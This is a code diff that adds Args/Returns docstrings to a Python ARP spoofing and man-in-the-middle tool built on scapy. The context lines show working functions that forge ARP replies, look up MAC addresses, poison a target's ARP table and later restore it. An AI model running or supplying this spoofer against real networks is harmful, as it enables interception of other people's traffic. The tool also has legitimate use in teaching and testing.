@@ -12,8 +12,13 @@ from sys import exit
 
 
 def get_args():
-    '''
-    get arguments from command line.
+    '''get arguments from command line
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     parser = argparse.ArgumentParser('ARP spoofer')
     parser.add_argument('-t', '--target', dest='target', help='target ip')
@@ -31,8 +36,14 @@ def get_args():
 
 
 def check_args(target_ip, spoof_ip):
-    '''
-    checks if arguments fetched are valid.
+    '''checks if arguments fetched are valid
+
+    Args:
+        target_ip (str): IP address of the target
+        spoof_ip (str): spoofed IP address which should be binded with your MAC address
+    
+    Returns:
+        bool: True if all args are valid else exit
     '''
     if not target_ip:
         exit(BRIGHT_RED +
@@ -45,16 +56,28 @@ def check_args(target_ip, spoof_ip):
 
 
 def generate_packet(pdst, hwdst, psrc):
-    '''
-    generates spoof packets.
+    '''generates spoof packets.
+    
+    Args:
+        pdst (str): IP address of destination
+        hwdst (str): MAC address of destination
+        psrc (str): IP address of source
+
+    Returns:
+        scapy.ARP: spoofed ARP packet with specified configuration
     '''
     packet = sp.ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
     return packet
 
 
 def get_mac(ip):
-    '''
-    retrieves mac address from the ip.
+    '''retrieves mac address from the ip.
+    
+    Args:
+        ip (str): IP address
+
+    Returns:
+        str: MAC address of specified IP address
     '''
     try:
         arp_req = sp.ARP(pdst=ip)
@@ -72,8 +95,15 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip, args_status):
-    '''
-    spoof target with spoof ip mac.
+    '''spoof target with spoof ip mac
+
+    Args:
+        target_ip (str): IP address of target machine
+        spoof_ip (str): IP address to be spoofed by attacker's machine
+        args_status (bool): True if cli args are valid else False
+    
+    Returns:
+        None
     '''
     if args_status:
         target_mac = get_mac(target_ip)
@@ -84,8 +114,15 @@ def spoof(target_ip, spoof_ip, args_status):
 
 
 def mitm(target_ip, spoof_ip, args_status):
-    '''
-    performs man in the middle attack by arp poisoning.
+    '''performs man in the middle attack by arp poisoning
+
+    Args:
+        target_ip (str): IP address of target machine
+        spoof_ip (str): IP address to be spoofed by attacker's machine
+        args_status (bool): True if cli args are valid else False
+    
+    Returns:
+        None
     '''
     print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
     packets_sent = 0
@@ -105,8 +142,15 @@ def mitm(target_ip, spoof_ip, args_status):
 
 
 def spoof_only(target_ip, spoof_ip, args_status):
-    '''
-    only spoofs the specified target.
+    '''only spoofs the specified target.
+
+    Args:
+        target_ip (str): IP address of target machine
+        spoof_ip (str): IP address to be spoofed by attacker's machine
+        args_status (bool): True if cli args are valid else False
+    
+    Returns:
+        None
     '''
     print(BRIGHT_YELLOW + f'[+] Spoofing {target_ip} as {spoof_ip}....')
 
@@ -126,8 +170,14 @@ def spoof_only(target_ip, spoof_ip, args_status):
 
 
 def restore_default_table(dst_ip, src_ip):
-    '''
-    restore default arp table of spoofed targets.
+    '''restore default arp table of spoofed targets
+
+    Args:
+        dst_ip (str): IP address of destination machine
+        src_ip (str): IP address to be spoofed by src machine
+    
+    Returns:
+        None
     '''
     try:
         dst_mac = get_mac(dst_ip)
@@ -143,8 +193,15 @@ def restore_default_table(dst_ip, src_ip):
 
 
 def run_spoofer(target_ip, spoof_ip, perform_mitm):
-    '''
-    start spoofer.
+    '''start spoofer
+    
+    Args:
+        dst_ip (str): IP address of destination machine
+        src_ip (str): IP address to be spoofed by src machine
+        perform_mitm (bool): True if MITM has to be performed else False
+
+    Returns:
+        None
     '''
     TARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm
     ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
